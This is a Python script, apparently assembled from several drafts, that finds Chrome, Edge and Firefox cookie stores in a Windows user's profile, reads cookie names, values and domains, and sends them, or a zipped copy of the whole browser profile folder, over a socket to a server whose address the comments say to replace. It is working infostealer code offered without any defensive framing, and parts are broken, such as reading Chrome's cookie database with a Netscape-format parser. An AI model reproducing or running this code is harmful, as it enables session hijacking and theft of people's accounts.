import os
import socket
import threading
import sqlite3
from http.cookiejar import MozillaCookieJar
import socket
from pathlib import Path


def find_cookies_files():
    cookies_files = []

    # Get the user's home directory
    home = Path.home()
    print(f"Home directory: {home}")

    # Chrome
    chrome_cookies_path = home / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
    if chrome_cookies_path.exists():
        cookies_files.append(chrome_cookies_path)

    # Edge
    edge_cookies_path = home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default" / "Cookies"
    if edge_cookies_path.exists():
        cookies_files.append(edge_cookies_path)

    # Firefox
    firefox_profiles_path = home / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
    if firefox_profiles_path.exists():
        for profile_folder in firefox_profiles_path.iterdir():
            firefox_cookies_path = profile_folder / "cookies.sqlite"
            if firefox_cookies_path.exists():
                cookies_files.append(firefox_cookies_path)

    return cookies_files

def get_next_folder_id():
    current_max = 0
    for item in os.scandir('.'):
        if item.is_dir() and item.name.isdigit():
            current_max = max(current_max, int(item.name))
    return current_max + 1

def get_firefox_cookies(file_path):
    cookies = []
    try:
        conn = sqlite3.connect(file_path)
        cursor = conn.cursor()

        for row in cursor.execute("SELECT * FROM moz_cookies"):
            cookie = {
                "name": row[2],
                "value": row[3],
                "domain": row[1],
                "path": row[5],
                "secure": bool(row[6]),
                "expires": row[7],
                "httpOnly": bool(row[8]),
                "sameSite": row[9],
            }
            cookies.append(cookie)

        conn.close()
        print(f"Read {len(cookies)} cookies from Firefox")
    except sqlite3.Error as e:
        print(f"Error reading Firefox cookies: {e}")
    return cookies

def get_chrome_edge_cookies(file_path):
    cookies = []
    cookie_jar = MozillaCookieJar()
    try:
        cookie_jar.load(file_path, ignore_discard=True, ignore_expires=True)
        for cookie in cookie_jar:
            cookies.append({
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "expires": cookie.expires,
                "httpOnly": cookie.has_nonstandard_attr("HttpOnly"),
                "sameSite": cookie.get_nonstandard_attr("SameSite"),
            })
        print(f"Read {len(cookies)} cookies from Chrome/Edge")
    except Exception as e:
        print(f"Error reading Chrome/Edge cookies: {e}")
    return cookies

def send_cookies(client_socket, cookies_files_list):
    cookies = []
    for file_path in cookies_files_list:
        if file_path.suffix == ".sqlite":
            cookies += get_firefox_cookies(file_path)
        elif file_path.name == "Cookies":
            cookies += get_chrome_edge_cookies(file_path)

    cookie_data = "\n".join([f"{cookie['name']}={cookie['value']} ({cookie['domain']})" for cookie in cookies])
    client_socket.sendall(cookie_data.encode())


def handle_client(client_socket, folder_id, cookies_files_list):
    folder = Path(str(folder_id))
    folder.mkdir()

    try:
        send_cookies(client_socket, cookies_files_list)

        with client_socket:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break

                with open(folder / "data.txt", "ab") as file:
                    file.write(data)
    except Exception as e:
        print(f"Error handling client connection: {e}")
    finally:
        client_socket.close()

def start_server(cookies_files_list):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 12345))
    server_socket.listen()

    print("Server is waiting for connections...")

    try:
        while True:
            client_socket, _ = server_socket.accept()
            folder_id = get_next_folder_id()
            print(f"New connection received. Folder ID: {folder_id}")

            client_thread = threading.Thread(target=handle_client, args=(client_socket, folder_id, cookies_files_list))
            client_thread.start()
    except KeyboardInterrupt:
        print("Shutting down the server...")
    except Exception as e:
        print(f"Error in server: {e}")
    finally:
        server_socket.close()

    




# Include the previous functions: find_cookies_files, get_firefox_cookies, get_chrome_edge_cookies

def send_cookies_to_server(server_host, server_port, cookies_files_list):
    cookies = []

    for file_path in cookies_files_list:
        if file_path.suffix == ".sqlite":
            cookies += get_firefox_cookies(file_path)
        elif file_path.name == "Cookies":
            cookies += get_chrome_edge_cookies(file_path)

    cookie_data = "\n".join([f"{cookie['name']}={cookie['value']} ({cookie['domain']})" for cookie in cookies])
    print(f"Cookies to send to the server: {cookie_data}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))
        client_socket.sendall(cookie_data.encode())
        print("Cookies sent to the server.")

def main2():
    cookies_files_list = find_cookies_files()

    server_host = "localhost"  # Replace with the server's IP address
    server_port = 12345         # Replace with the server's port number

    send_cookies_to_server(server_host, server_port, cookies_files_list)


import os
import socket
from pathlib import Path
import zipfile
import io

# Include the previous find_cookies_files function

def zip_cookies_folder(cookies_folder_path):
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for root, _, files in os.walk(cookies_folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zip_file.write(file_path, os.path.relpath(file_path, cookies_folder_path))

    zip_buffer.seek(0)
    return zip_buffer

def send_cookies_folder_to_server(server_host, server_port, cookies_folder_path):
    zip_buffer = zip_cookies_folder(cookies_folder_path)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))

        # Send the size of the ZIP file
        zip_size = zip_buffer.getbuffer().nbytes
        client_socket.sendall(zip_size.to_bytes(8, byteorder="big"))

        # Send the ZIP file
        client_socket.sendall(zip_buffer.getvalue())
        print("Cookies folder sent to the server.")

def main3():
    cookies_files_list = find_cookies_files()

    # Choose the folder of the first cookies file found
    cookies_folder_path = cookies_files_list[0].parent if cookies_files_list else None

    if cookies_folder_path:
        server_host = "localhost"  # Replace with the server's IP address
        server_port = 12345         # Replace with the server's port number

        send_cookies_folder_to_server(server_host, server_port, cookies_folder_path)
    else:
        print("No cookies folder found.")

if __name__ == "__main__":
    main3()
